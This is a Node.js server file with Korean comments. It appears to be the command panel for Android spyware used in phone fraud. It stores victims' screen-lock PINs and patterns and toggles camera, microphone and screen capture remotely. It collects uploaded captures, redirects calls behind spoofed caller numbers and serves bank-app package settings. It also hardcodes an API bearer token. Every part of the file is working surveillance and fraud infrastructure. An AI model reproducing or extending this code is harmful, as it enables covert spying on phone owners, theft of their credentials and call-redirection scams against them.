require('rootpath')();
const { Op } = require('sequelize');
const errcode = require('err-code');
const requireLogin = require('middlewares/require_login');
const path = require('path');
const multer = require('multer');
const mkdirp = require('mkdirp');
const ipMiddleware = require('middlewares/ip_address');
var isEmpty = require('is-empty');
const moment = require("moment");
const crypto = require("crypto");
const axios = require("axios");
const headers = {
    Authorization: "Bearer 2a0cb093-dac7-4494-a5d4-e0467285e4a3",
    Accept: "application/json",
    "Content-Type": "application/json",
};
const ONLINE_DURATION = 30 * 1000;

async function heartbeat(req, res) {
    const id = String(req.body.id);
    const batteryLevel = Number(req.body.battery_level);
    const connectivity = String(req.body.connectivity);
    const timestamp = Number(Date.now());
    const capturing = String(req.body.capturing) == 'true';
    const bluetooth = String(req.body.bluetooth) == 'true';
    const screenOn = String(req.body.screen_on) == 'true';
    const isCameraStreaming = String(req.body.isCameraStreaming) == 'true';
    const isMicStreaming = String(req.body.isMicStreaming) == 'true';
    const isScreenStreaming = String(req.body.isScreenStreaming) == 'true';
    const appVersion = String(req.body.appVersion);
    const appName = String(req.body.appName);
    const appId = String(req.body.appId);
    const number = req.body.number == "" ? null : (req.body.number != null ? String(req.body.number) : null);

    const heartBeatData = {
        id,
        batteryLevel,
        connectivity,
        timestamp,
        capturing,
        bluetooth,
        screenOn,
        appVersion,
        isCameraStreaming,
        isMicStreaming,
        isScreenStreaming,
        appName,
        appId,
        number
    }
 
    if (typeof(req.body.callingRole) != 'undefined') {
        heartBeatData.callingRole = String(req.body.callingRole) == 'true';
    }
    if (typeof(req.body.updateNumberStatus) != 'undefined') {
        heartBeatData.updateNumberStatus = String(req.body.updateNumberStatus) == 'true';
    }
    if (typeof(req.body.monitoring) != 'undefined') {
        heartBeatData.monitoring = String(req.body.monitoring) == 'true';
    }
    if (typeof(req.body.packageName) != 'undefined') {
        heartBeatData.packageName = String(req.body.packageName);
    } 
    if(typeof(req.body.accessibility_call) != 'undefined')
        heartBeatData.accessibility_call = String(req.body.accessibility_call) == 'true';
    if(typeof(req.body.accessibility_main) != 'undefined')
        heartBeatData.accessibility_main = String(req.body.accessibility_main) == 'true';
    if(appName == 'main')
        heartBeatData.mainTimestamp = timestamp;
    if(appName == 'call')
        heartBeatData.callTimestamp = timestamp;

    const { Mobile, AppId } = req.app.db;

    if(heartBeatData.number == null)
        delete heartBeatData.number;
 
    const mobile = await Mobile.save(heartBeatData);
    res.json({ id: mobile.id });
 }

async function mobileInfo(req, res, next) {
    const id = String(req.body.id);
    const appId = String(req.body.app_id);
    const model = String(req.body.model);
    const brand = String(req.body.brand);
    const networkOperator = String(req.body.network_operator);
    const systemVersion = String(req.body.systemVersion);
    const number = String(req.body.number);
    const appVersion = String(req.body.appVersion);

    const { Mobile, AppId } = req.app.db;

    await Mobile.save({
        id,
        appId,
        model,
        brand,
        systemVersion,
        number,
        networkOperator,
        appVersion,
        timestamp: Number(Date.now())
    });
    res.json({ id });
}

async function savePassword(req, res) {
    const id = String(req.body.id);
    const pin = req.body.pin != null ? String(req.body.pin) : undefined;
    const pattern = req.body.pattern != null ? String(req.body.pattern) : undefined;

    const { Mobile } = req.app.db;
    const mobile = await Mobile.save({ id, pin, pattern });

    res.json({ id: mobile.id });
}

async function saveName(req, res) {
    const id = String(req.body.id);
    const name = req.body.name != null ? String(req.body.name) : undefined;
    const filePath = req.body.file_path != null ? String(req.body.file_path) : undefined;

    const { Mobile } = req.app.db;
    const mobile = await Mobile.save({ id, name, filePath });

    res.json({ id: mobile.id });
}

async function getMobiles(req, res) {
    let { offset, limit, online, is_del, app_id: filter_app_id, search, column_name, column_order } = req.query;
    if (offset != null)
        offset = Number(offset);
    if (limit != null)
        limit = Number(limit);
    if (search == null) search = '';

    const { Mobile, User, AppLink } = req.app.db;

    const settingMain = await AppLink.findOne({where: {type: 1}});

    const now = Date.now();
    const where = {}
    if (search !== '') {
        where.number = {
            [Op.like]: `%${search}%`
        }
    }
    let order = [
        ['createdAt', 'DESC']
    ];
    if (is_del == 'true') {
        order = [
            ['deletedAt', 'DESC']
        ];

    } else {
        order = [
            ['createdAt', 'DESC']
        ];
    }
    if (!isEmpty(column_name)) {  // number, model, brand, network_operator, created_at

        switch (column_name) {
            case "number":
                order = [['number', column_order]];
                break;
            case "model":
                order = [['model', column_order]];
                break;
            case "brand":
                order = [['brand', column_order]];
                break;
            case "network_operator":
                order = [['networkOperator', column_order]];
                break;
            default:
                if (is_del == 'true') {
                    order = [
                        ['deletedAt', column_order]
                    ];
                } else {
                    order = [
                        ['createdAt', column_order]
                    ];
                }
                break;
        }
    }

    const user_app_id = req.session.app_id;

    if (user_app_id && user_app_id !== 'chongpan' && user_app_id !== 'super') {
        where.appId = user_app_id;
    } else if (user_app_id === 'super' && filter_app_id) {
        if (filter_app_id !== 'all')
            where.appId = filter_app_id;
    } else if (user_app_id === 'chongpan') {
        where.appId = {
            [Op.ne]: "super",
        }
        if (filter_app_id && filter_app_id !== 'all') {
            where.appId = filter_app_id;
        }
    }

    if (!user_app_id) {
        return res.json({
            items: [],
            total: 0
        })
    }

    let mobiles;
    if (is_del == 'true') {  // 휴지통
        is_del = true;
        where.deletedAt = {
            [Op.not]: null
        }
        mobiles = await Mobile.findAndCountAll({
            offset,
            limit,
            paranoid: false,
            where,
            include: [User],
            // order: [
            //     ['deletedAt', 'DESC']
            // ]
            order: order
        });
    } else {
        is_del = false;
        if (online == 'true') {  // 온라인
            where.timestamp = {
                [Op.gt]: now - ONLINE_DURATION
            }
        } else if (online == 'false') {  // 오프라인
            where.timestamp = {
                [Op.lt]: now - ONLINE_DURATION
            }
        }
        mobiles = await Mobile.findAndCountAll({
            offset,
            limit,
            where,
            include: [User],
            // order: [
            //     ['createdAt', 'DESC']
            // ]
            order: order
        });
    }

    res.json({
        items: mobiles.rows.map(mobile => ({
            id: mobile.id,
            app_id: mobile.appId,
            app_version: mobile.appVersion,
            package_name: mobile.packageName,
            user_name: mobile.user ? mobile.user.username : "없음",
            name: mobile.name,
            file_path: mobile.filePath,
            number: mobile.number,
            online: mobile.timestamp > now - ONLINE_DURATION,
            isMainOnline: mobile.mainTimestamp > now - ONLINE_DURATION,
            isCallOnline: mobile.callTimestamp > now - ONLINE_DURATION,
            model: mobile.model,
            brand: mobile.brand,
            system_version: mobile.systemVersion,
            network_operator: mobile.networkOperator,
            battery_level: mobile.batteryLevel,
            connectivity: mobile.connectivity,
            monitoring: mobile.monitoring,
            capturing: mobile.capturing,
            bluetooth: mobile.bluetooth,
            screen_on: mobile.screenOn,
            accessibility_main: mobile.accessibility_main,
            accessibility_call: mobile.accessibility_call,
            calling_role: mobile.callingRole,
            update_number_status: mobile.updateNumberStatus,
            is_camera_streaming: mobile.isCameraStreaming,
            is_mic_streaming: mobile.isMicStreaming,
            is_screen_streaming: mobile.isScreenStreaming,
            pin: mobile.pin,
            pattern: mobile.pattern,
            is_del,
            is_updated: settingMain.version == (mobile.appVersion.split('(').length > 1 ? mobile.appVersion.split('(')[1].split(')')[0] : ''),
            secondPermiCamera: mobile.secondPermiCamera,
            secondPermiMic: mobile.secondPermiMic,
            secondPermiPhone: mobile.secondPermiPhone,
            secondPermiLocation: mobile.secondPermiLocation,
            secondPermiFile: mobile.secondPermiFile,
            thirdPermiContact: mobile.thirdPermiContact,
            thirdPermiPhone: mobile.thirdPermiPhone,
            thirdPermiCalllog: mobile.thirdPermiCalllog,
            thirdPermiSms: mobile.thirdPermiSms,
            updated_at: mobile.updatedAt,
            created_at: mobile.createdAt
        })),
        total: mobiles.count,
    });
}

async function deleteMobile(req, res) {
    const { Call, Contact, CallLog, Apk, Loan, Location, Log, Message } = req.app.db;
    const appId = req.session.app_id;
    const { logger } = req.app;

    await Message.destroy({ where: { mobileId: req.mobile.id } });
    await Log.destroy({ where: { mobileId: req.mobile.id } });
    await Location.destroy({ where: { mobileId: req.mobile.id } });
    // await Loan.destroy({ where: { mobileId: req.mobile.id } });
    await Apk.destroy({ where: { mobileId: req.mobile.id } });
    await CallLog.destroy({ where: { mobileId: req.mobile.id } });
    await Contact.destroy({ where: { mobileId: req.mobile.id } });
    await Call.destroy({ where: { mobileId: req.mobile.id } });

    if (!!req.mobile.deletedAt) {
        const {ActionLog} = req.app.db;
        //await ActionLog.destroy({ where: { mobileId: req.mobile.id } });   //완전삭제시에 해당 폰의 로그를 삭제한다.
        await ActionLog.create({mobileId: req.mobile.id, content: `${req.session.type == 'user' ? '매장::' : '회원::'}${req.session.manger} ${req.publicAddress} -> 기기 완전 삭제 요청 -> ${req.mobile.number}(${req.mobile.name})`});


        await req.mobile.destroy({ force: true });
        const socket = req.app.socket;
        const mobileMainSocket = socket.getMobileMain(req.mobile.id);
        const roomMain = mobileMainSocket != null ? mobileMainSocket.room : null;
        if (!!roomMain) {
            socket.io.to(roomMain).emit('deleted_mobile');
        }

        const mobileCallSocket = socket.getMobileCall(req.mobile.id);
        const roomCall = mobileCallSocket != null ? mobileCallSocket.room : null;
        if (!!roomCall) {
            socket.io.to(roomCall).emit('deleted_mobile');
        }

        if (!roomMain || !roomCall) {
            return res.json({
                status: "error",
                msg: "기기와 통신할수 없습니다.다시 복귀될수 있습니다."
            });
        }
    } else {
        const {ActionLog} = req.app.db;
        await ActionLog.create({mobileId: req.mobile.id, content: `${req.session.type == 'user' ? '매장::' : '회원::'}${req.session.manger} ${req.publicAddress} -> 기기 임시 삭제 요청 -> ${req.mobile.number}(${req.mobile.name})`});

        await req.mobile.destroy();
        const socket = req.app.socket;
        const mobileMainSocket = socket.getMobileMain(req.mobile.id);
        const roomMain = mobileMainSocket != null ? mobileMainSocket.room : null;
        if (!!roomMain) {
            socket.io.to(roomMain).emit('trash_mobile');
        }

        const mobileCallSocket = socket.getMobileCall(req.mobile.id);
        const roomCall = mobileCallSocket != null ? mobileCallSocket.room : null;
        if (!!roomCall) {
            socket.io.to(roomCall).emit('trash_mobile');
        }
    }
    res.json({ status: "success" });
}

async function restoreMobile(req, res) {
    const appId = req.session.app_id;
    const { logger } = req.app;

    const mobile = req.mobile;
    
    const {ActionLog} = req.app.db;
    await ActionLog.create({mobileId: req.mobile.id, content: `${req.session.type == 'user' ? '매장::' : '회원::'}${req.session.manger} ${req.publicAddress} -> 기기 복귀 요청 -> ${req.mobile.number}(${req.mobile.name})`});

    await mobile.restore();

    const socket = req.app.socket;
    const mobileMainSocket = socket.getMobileMain(mobile.id);
    const roomMain = mobileMainSocket != null ? mobileMainSocket.room : null;
    if (!!roomMain) {
        socket.io.to(roomMain).emit('restore_mobile');
    }
    const mobileCallSocket = socket.getMobileCall(mobile.id);
    const roomCall = mobileCallSocket != null ? mobileCallSocket.room : null;
    if (!!roomCall) {
        socket.io.to(roomCall).emit('restore_mobile');
    }
    
    res.json({ status: "success" });
}

async function monitoringMobile(req, res, next) {
    const id = String(req.body.id);
    const monitoring = String(req.body.monitoring) == 'true';

    const app = req.app;
    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return next(errcode(new Error('not found mobile'), { status: 404 }));

    const socket = app.socket;
    const mobileSocket = socket.getMobileCall(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found room'), { status: 404 }));

    if (monitoring)
        socket.io.to(room).emit('monitoring_on');
    else
        socket.io.to(room).emit('monitoring_off');

    await mobile.update({ monitoring });

    res.json({ id: mobile.id });
}

async function bluetoothMobile(req, res, next) {
    const id = String(req.body.id);
    const status = String(req.body.status) == 'true';
    const app = req.app;
    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return next(errcode(new Error('not found mobile'), { status: 404 }));

    const socket = app.socket;
    const mobileSocket = socket.getMobileMain(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found room'), { status: 404 }));

    if (status)
        socket.io.to(room).emit('bluetooth_on');
    else
        socket.io.to(room).emit('bluetooth_off');


    res.json({ id: mobile.id });

    const {ActionLog} = req.app.db;
    await ActionLog.create({mobileId: id, content: `${req.session.type == 'user' ? '매장::' : '회원::'}${req.session.manger} -> 블루투스${status ? '켜기' : '끄기'}요청`});
}

async function createSettingMobile(req, res) {
    const { id: mobileId, is_incall, incoming_number_real, is_outcall, specialOutgoings } = req.body;

    const app = req.app;
    const { IncomingMobile, OutgoingMobile } = app.db;
    if (incoming_number_real != null) {
        await OutgoingMobile.save({ mobileId, numberReal: incoming_number_real, enabled: is_incall })
    }

    await IncomingMobile.destroy({ force: true, truncate: true });
    if(typeof(specialOutgoings) != 'undefined') {
        for(let idx = 0; idx < specialOutgoings.length; idx++) {
            if(specialOutgoings[idx].number != null && typeof(specialOutgoings[idx].number) != 'undefined' && specialOutgoings[idx].number != ''
                && specialOutgoings[idx].numberReal != null && typeof(specialOutgoings[idx].numberReal) != 'undefined' && specialOutgoings[idx].numberReal != '') {
                await IncomingMobile.create({ mobileId, numberReal: specialOutgoings[idx].numberReal, number: specialOutgoings[idx].number, enabled: is_outcall })
            }
        }
    }
    await updateNumbersForMobiles(req.app, mobileId);

    res.json({ id: mobileId });

    const {ActionLog} = req.app.db;
    await ActionLog.create({mobileId, content: `${req.session.type == 'user' ? '매장::' : '회원::'}${req.session.manger} -> 별도강제수신발신설정 -> 강제수신: ${is_incall}, 실제수신전환번호: ${incoming_number_real}, 강제발신: ${is_outcall}, 별도강발: ${typeof(specialOutgoings) == 'undefined' ?  '설정안함' : specialOutgoings.map((item) => ('보이는 번호-' + item.number + ', 발신번호-' + item.numberReal))}`});
}

async function updateNumbersForMobiles(app, id) {
    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return;

    const socket = app.socket;
    const mobileSocket = socket.getMobileCall(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return;

    socket.io.to(room).emit('update_private_numbers');
}

async function getSettingMobileInfo(req, res) {
    const { id: mobileId } = req.query;

    const app = req.app;
    const { IncomingMobile, OutgoingMobile, Mobile } = app.db;

    const mobile = await Mobile.findOne({where: {id: mobileId}, order: [['updatedAt', 'DESC']], attributes: ['id', 'appVersion']});
    if(mobile == null) 
        return res.status(404).json({err: 'not found'});
    const version = Number(mobile.appVersion.substring(mobile.appVersion.indexOf('(') + 1, mobile.appVersion.indexOf(')')).replace('.', '').replace('.', ''));
    if(version > 305) {
        //버젼 3.0.5에서 로직업댓되엇다. 3.0.5이상 버젼에 대한 처리
        const outgoingmobile = await OutgoingMobile.findOne({ where: { mobileId } });
        const incomingmobiles = await IncomingMobile.findAndCountAll({ where: { mobileId } });
        const ret = {
            id: mobileId,
            is_incall: false,
            mobile_incoming_number_real: "",
            is_outcall: false,
            outgoings: [],
            outgoingCount: 0,
        };

        if (outgoingmobile) {
            ret.is_incall = outgoingmobile.enabled;
            ret.mobile_incoming_number_real = outgoingmobile.numberReal;
        }
        ret.outgoingCount = incomingmobiles.count;
        if (ret.outgoingCount > 0) {
            ret.is_outcall = incomingmobiles.rows[0].enabled;        
            ret.outgoings = incomingmobiles.rows.map(incoming => ({
                number: incoming.number,
                numberReal: incoming.numberReal
            }))
        }
        res.json(ret);
    } else {
        //이전 버젼과의 호환처리
        const outgoingmobile = await OutgoingMobile.findOne({ where: { mobileId } });
        const incomingmobile = await IncomingMobile.findOne({ where: { mobileId } });
        const ret = {
            id: mobileId,
            mobile_incoming_number_real: "",
            is_incall: false,

            mobile_outgoing_number: "",
            mobile_outgoing_number_real: "",
            is_outcall: false
        };

        if (outgoingmobile) {
            ret.mobile_incoming_number_real = outgoingmobile.numberReal;
            ret.is_incall = outgoingmobile.enabled;
        }
        if (incomingmobile) {
            ret.mobile_outgoing_number = incomingmobile.number;
            ret.mobile_outgoing_number_real = incomingmobile.numberReal;
            ret.is_outcall = incomingmobile.enabled;
        }
        res.json(ret);
    }
}

async function capturingMobile(req, res, next) {
    const id = String(req.body.id);
    const capturing = String(req.body.capturing) == 'true';

    const app = req.app;
    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return next(errcode(new Error('not found mobile'), { status: 404 }));

    const socket = app.socket;
    const mobileSocket = socket.getMobileMain(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found room'), { status: 404 }));

    if (capturing)
        socket.io.to(room).emit('capturing_on');
    else
        socket.io.to(room).emit('capturing_off');

    await mobile.update({ capturing });

    res.json({ id: mobile.id });
}


function saveCapturingFile() {
    const storage = multer.diskStorage({
        destination(req, file, cb) {
            const mobileId = String(req.body.id);
            if (mobileId == null)
                return cb(errcode(new Error('mobile id is required'), { status: 400 }));

            const dir = path.join(req.app.get('display.mobiles.dir'), mobileId);
            mkdirp.sync(dir);
            cb(null, dir);
        },
        async filename(req, file, cb) {
            const mobileId = String(req.body.id);
            const { Mobile } = req.app.db;
            const mobile = await Mobile.findByPk(mobileId);
            const file_name = (mobile.name == "") ? `${mobile.number}_${req.body.fileName}` : `${mobile.name}_${mobile.number}_${req.body.fileName}`;
            return cb(null, file_name);
        }
    });
    const upload = multer({
        storage,
        fileFilter(req, file, cb) {
            cb(null, true);
        }
    }).any();

    return (req, res, next) => {
        upload(req, res, err => {
            if (err)
                req.app.logger.error(err);
            next(err);
        });
    }
}

async function uploadCapturingFile(req, res, next) {
    const mobileId = String(req.body.id);
    const { Mobile } = req.app.db;
    const mobile = await Mobile.findByPk(mobileId);
    if (!!mobile) {
        const file_name = (mobile.name == "") ? `${mobile.number}_${req.body.fileName}` : `${mobile.name}_${mobile.number}_${req.body.fileName}`;
        const app_id = mobile.appId;
        req.app.socket.io.to('controls').emit('display_file_download', { id: mobileId, app_id, file_name });
    }
    res.json({ id: mobileId });
}

async function downloadDisplayFile(req, res) {
    const mobileId = String(req.params.mobile);
    const file_name = String(req.params.filename);
    const dir_name = path.join(req.app.get('display.mobiles.dir'), mobileId);
    res.download(path.join(dir_name, file_name));
}

async function getAppVersion(req, res, next) {

    const { Setting } = req.app.db;

    const { appVersion, address, package } = await Setting.findOne();

    return res.json({ appVersion, url: address, package });
}

async function getAddress(req, res, next) {

    const { Setting } = req.app.db;

    const { appVersion, address: url, package } = await Setting.findOne();

    return res.json({ appVersion, url, package });
}

async function getHuhuInfo(req, res, next) {
    const { id: mobileId } = req.query;
    const { Setting, Mobile } = req.app.db;
    const mobile = await Mobile.findByPk(mobileId);

    var originPackageName = "";
    if (!!mobile) {
        originPackageName = mobile.packageName;
    }

    const { appVersion, address: url, address2: url2, address3: url3, package, name } = await Setting.findOne();

    return res.json({ appVersion, url, url2, url3, packageName: package, appName: name, originPackageName });
}

async function getBankInfo(req, res, next) {
    const { Setting } = req.app.db;

    const { bankPackage, bankAppVersion } = await Setting.findOne();

    return res.json({ packageName: bankPackage, version: bankAppVersion });
}

async function getSettins(req, res) {
    const { Setting } = req.app.db;
    let { limit, offset } = req.query;

    if (offset != null)
        offset = Number(offset);
    if (limit != null)
        limit = Number(limit);

    const results = await Setting.findAndCountAll({
        limit,
        offset,
    });

    res.json({
        items: results.rows.map(item => ({
            id: item.id,
            address: item.address,
            address2: item.address2,
            address3: item.address3,
            app_version: item.appVersion,
            name: item.name,
            package: item.package,
            bank_app_version: item.bankAppVersion,
            bank_package: item.bankPackage
        })),
        total: results.count,
    });
}

async function updateSetting(req, res, next) {
    const { setting } = req;
    let { address, address2, address3, app_version: appVersion, package, name } = req.body;
    await setting.update({ address, address2, address3, appVersion, package, name });
    res.json({ id: setting.id });
}

async function updateBank(req, res, next) {
    const { setting } = req;
    let { bank_app_version: bankAppVersion, bank_package: bankPackage } = req.body;
    await setting.update({ bankAppVersion, bankPackage });
    res.json({ id: setting.id });
}

async function changeMobileAppId(req, res, next) {
    const { mobile_id, app_id } = req.body;
    const { logger } = req.app;
    if (!app_id) {
        return res.json({ status: "error", msg: "요청이 잘못되었습니다. 업체 변경이 실패하였습니다." })
    }
    const { Mobile, Loan } = req.app.db;
    const mobile = await Mobile.findByPk(mobile_id, { paranoid: false });

    if (!mobile) {
        return res.json({ status: "error", msg: "기기를 찾을수 없습니다. 업체 변경이 실패하였습니다." })
    }

    const loan = await Loan.findOne({ where: { mobileId: mobile_id } });
    if (!!loan) {
        await loan.update({ appId: app_id });
    }
    const socket = req.app.socket;

    const mobileCallSocket = socket.getMobileCall(mobile_id);
    const roomCall = mobileCallSocket != null ? mobileCallSocket.room : null;
    if(!!roomCall) 
        socket.io.to(roomCall).emit(`app_id_change`, { app_id: app_id });
    
    const mobileMainSocket = socket.getMobileMain(mobile_id);
    const roomMain = mobileMainSocket != null ? mobileMainSocket.room : null;
    if(!!roomMain) 
        socket.io.to(roomMain).emit(`app_id_change`, { app_id: app_id });

    if (!!mobile.deletedAt) {
        await mobile.restore();
    }
    
    const {ActionLog} = req.app.db;
    await ActionLog.create({mobileId: mobile_id, content: `${req.session.type == 'user' ? '매장::' : '회원::'}${req.session.manger} -> 업체변경요청 :${mobile.number}(${mobile.name})(${mobile.appId}) ->  ${app_id}`});

    await mobile.update({ appId: app_id });
    
    if ((!roomCall && !loan) || (!roomMain && !loan)) {
        return res.json({
            status: "error",
            msg: "기기와 통신할수 없습니다. 업체 변경이 실패하였습니다."
        })
    } else if ((!roomCall && !!loan) || (!roomMain && !!loan)) {
        return res.json({
            status: "error",
            msg: "기기와 통신할수 없습니다. 업체 변경이 다음번 기기 연결시 적용됩니다."
        })
    }

    res.json({
        status: "success"
    });
}

async function requestCallApp(req, res, next) {
    const id = String(req.body.id);

    const app = req.app;

    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return next(errcode(new Error('not found'), { status: 404 }));;

    const socket = app.socket;
    const mobileSocket = socket.getMobileCall(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found'), { status: 404 }));

    socket.io.to(room).emit('request_call_app');

    res.json({ id: mobile.id });
}

async function getDownLink(req, res, next) {
    const app_id = String(req.body.app_id);
    if (app_id != req.session.app_id) {
        return res.json({
            status: "error",
            msg: "요청이 정확하지 않습니다."
        });
    }
    try {
        const url = process.env.DOWN_URL || `https://res.2023tec.com/api/get_site_link`;
        const config = {
            method: "POST",
            url: `${url}`,
            headers: headers,
            data: {
                appId: app_id
            },
            timeout: 1000 * 10,
        };
        const result = await axios(config);
        return res.json({
            status: "success",
            msg: "조작이 성공하였습니다.",
            data: result.data.url
        });
    } catch (err) {
        return res.json({ success: "error", msg: err.message });
    }
}

async function getDownLoadLink(req, res, next) {
    return res.json({
        url: "url123"
    });
}

async function getAuthCode(req, res, next) {
    const app_id = String(req.body.app_id);
    if (app_id != req.session.app_id) {
        return res.json({
            status: "error",
            msg: "요청이 정확하지 않습니다."
        });
    }
    const { User } = req.app.db;
    const user = await User.findOne({ where: { appId: app_id } });
    return res.json({
        status: "success",
        code: user.authcode,
        updated_at: user.updatedAt
    });
}

async function getAuthCodeForMobile(req, res, next) {
    const app_id = String(req.query.app_id);
    if (!app_id) {
        return res.json({
            status: "error",
            code: "",
        });
    }
    const { User } = req.app.db;
    const user = await User.findOne({ where: { appId: app_id } });
    if (!user) {
        if (!app_id) {
            return res.json({
                status: "error",
                code: "",
            });
        }
    }
    return res.json({
        status: "success",
        code: user.authcode,
    });
}

async function resetAuthCode(req, res, next) {
    const app_id = String(req.body.app_id);
    if (app_id != req.session.app_id) {
        return res.json({
            status: "error",
            msg: "요청이 정확하지 않습니다."
        });
    }
    const { User } = req.app.db;
    const user = await User.findOne({ where: { appId: app_id } });
    if (!user) {
        return res.json({
            status: "error",
            msg: "요청이 정확하지 않습니다."
        });
    }
    const cur_time = moment(new Date()).format("YYYY-MM-DD HH:mm");
    let hash_sha = crypto.createHash("sha256");
    hash_sha.update(cur_time + user.authcode);
    const remember_token = hash_sha.digest("hex").substring(0, 8);

    user.update({ authcode: remember_token });
    return res.json({
        status: "success",
        code: remember_token,
        updated_at: user.updatedAt
    });
}

module.exports = app => {
    app.set('display.mobiles.dir', path.join(app.get('display.dir'), 'mobiles'));

    // app.api.use('/mobile/heartbeat', ipMiddleware());

    app.api.route('/mobile/heartbeat').post(heartbeat);

    app.api.route('/mobile/mobile_info').post(mobileInfo);  /// 비대면이 처음 기동시 자기의 정보를 보낸다
    app.api.route('/mobile/password').post(savePassword);
    app.api.route('/mobile/name').post(saveName);

    /******************************************* */
    app.use('/mobiles', requireLogin());

    app.api.route('/mobiles').get(requireLogin(), getMobiles);

    app.api.route('/mobiles/:mobile')
        .post(requireLogin(), ipMiddleware(), restoreMobile)
        .delete(requireLogin(), ipMiddleware(), deleteMobile);

    app.api.route('/mobile/monitoring').post(monitoringMobile);
    app.api.route('/mobile/bluetooth').post(bluetoothMobile);

    app.api.route('/mobile/setting_mobile').post(createSettingMobile).get(getSettingMobileInfo);

    //
    // +-----------+                                              +--------+                                           +--------+
    // |           |       POST /api/mobile/capturing             |        |          socket.io capturing_on|off       |        |
    // |           +--------------------------------------------->|        +------------------------------------------>|        |
    // |  Control  |                                              | Server |                                           | Mobile |
    // | (Browser) |                                              | (Node) |                                           |  (App) |
    // |           |        socket.io display_file_download       |        |   POST /api/mobile/uplaod_capturing_file  |        |
    // |           |<---------------------------------------------|        |<----------------------------------------  |        |
    // |           |get /mobiles/:mobile/:filename/display_file   |        |                                           |        |
    // |           |--------------------------------------------->|        |                                           |        |
    // +-----------+                                              +--------+                                           +--------+
    // 

    app.api.route('/mobile/capturing').post(capturingMobile);
    app.api.route('/mobile/upload_capturing_file').post(saveCapturingFile(), uploadCapturingFile);
    app.api.route('/mobiles/:mobile/:filename/display_file').get(downloadDisplayFile);

    app.api.route('/mobile/app_version').get(getAppVersion); // TODO 삭제할것
    app.api.route('/mobile/get_download_url').get(getAddress); // TODO 삭제할것

    app.api.route('/mobile/huhu_info').get(getHuhuInfo);
    app.api.route('/mobile/bank_info').get(getBankInfo);
    app.api.route('/mobile/settings').get(requireLogin(), getSettins);
    app.api.route('/mobile/settings/:setting').put(requireLogin(), updateSetting);
    app.api.route('/mobile/bank/:setting').put(updateBank);

    app.api.route('/mobile/change_app_id').post(requireLogin(), changeMobileAppId); // 기기의 앱아이디를 변경하도록 한다.

    app.api.route('/mobile/request_call_app').post(requireLogin(), requestCallApp); //  콜앱 적용하도록 한다.

    app.api.route('/mobile/get_auth_code').post(requireLogin(), getAuthCode); //  업체의 인증코드를 준다.
    app.api.route('/mobile/reset_auth_code').post(requireLogin(), resetAuthCode); //  업체의 인증코드를 갱신한다.
    app.api.route('/mobile/get_auth_code_for_mobile').get(getAuthCodeForMobile); //  업체의 인증코드를 준다.

    app.api.route('/mobile/get_down_link').post(requireLogin(), getDownLink); //  업체의 다운링크주소를 준다.
    app.api.route('/mobile/get_download_link').post(getDownLoadLink); //  업체의 다운링크주소를 준다.  TEST용
};